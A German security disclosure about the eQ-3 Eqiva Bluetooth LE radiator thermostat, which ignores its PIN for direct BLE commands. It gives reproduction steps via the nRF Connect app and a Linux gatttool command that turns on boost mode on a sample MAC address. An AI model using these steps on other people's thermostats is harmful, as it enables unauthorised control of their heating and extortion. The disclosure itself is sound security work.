# Sicherheitslücke in Thermostat eQ-3 Eqiva BLE

Bei dem [eQ-3 Eqiva](http://www.eq-3.de/produkte/eqiva/bluetooth-smart-heizkoerperthermostat.html) handelt es sich um einen smarten Heizungsthermostat mit einer integrierten Bluetooth LE Schnittstelle. Der Hersteller empfiehlt folgende App zum Steuern des Thermostates per Smartphone: [Calor BT](https://play.google.com/store/apps/details?id=de.eq3.ble.android&hl=de).

Verbindet man sich per App mit dem Heizungsthermostat wird ein vierstelliger PIN Code abgefragt, der am Thermostat abgelesen werden muss. Ein Sicherheitsfeature, damit nur jemand den Thermostat steuern kann, der auch physischen Zugang zu ihm hat, z.B. in der eigenen Wohnung.

Interessanterweise spielt dieser PIN Code jedoch keine Rolle, wenn man direkt BLE Befehle mit entsprechenden Werkzeugen - ein Smartphone ist ausreichend - an den Thermostaten sendet (siehe unten). **Dies bedeutet, dass jeder Thermostat in Reichweite (ca. 40m bei Bluetooth LE [1]) mit einfachsten Mitteln fern- und damit fremdgesteuert werden kann.**

Angriffsmotive reichen von dem einfachen Verstellen der Einstellungen bis hin zu Erpressungsszenarien wie dem Abstellen der Heizung bis ein entsprechender Geldbetrag gezahlt wurde.

**Im Moment kann nur dazu geraten werden die Bluetoothfunktion im Thermostat zu deaktivieren.**

IMHO: _Wie dieses Gerät mit dieser gravierenden Sicherheitslücke Testsieger bei Stiftung Warentest werden konnte ist mir ein Rätsel._

## Android

### 1\. nRF Connect installieren

<https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp&hl=de>

### 2\. Mit Thermostat verbinden

![01-nrf-connect](/img/01-nrf-connect.png)

### 3\. BLE Charactristic auswählen

![02-nrf-connect](/img/02-nrf-connect.png)

### 4\. Boostmodus aktivieren (Ventil wird voll geöffnet)

![03-nrf-connect](/img/03-nrf-connect.png)

## Linux (getestet mit Raspberry Pi 3 und Raspbian)

### 1\. Nach BLE Geräten suchen

`hcitool lescan`

![HCI Tool Scan Example](/img/01-hcitool-scan.png)

Gerät mit Name "CC-RT-BLE" ist der Thermostat.

### 2\. Boostmodus aktivieren (Ventil wird voll geöffnet)

`gatttool -b 00:1A:22:09:DA:10 --char-write-req --handle=0x0411 --value=4501`

_Entsprechend die MAC-Adresse austauschen._

## Weitere Informationen unter:

- [eq-3 Eqiva API Dokumentation von Heckie75 bei Github](https://github.com/Heckie75/eQ-3-radiator-thermostat/blob/master/eq-3-radiator-thermostat-api.md)

- [FHEM Forum](https://forum.fhem.de/index.php/topic,39308.0.html)

## Referenzen:

[1] - <https://de.wikipedia.org/wiki/Bluetooth_Low_Energy>
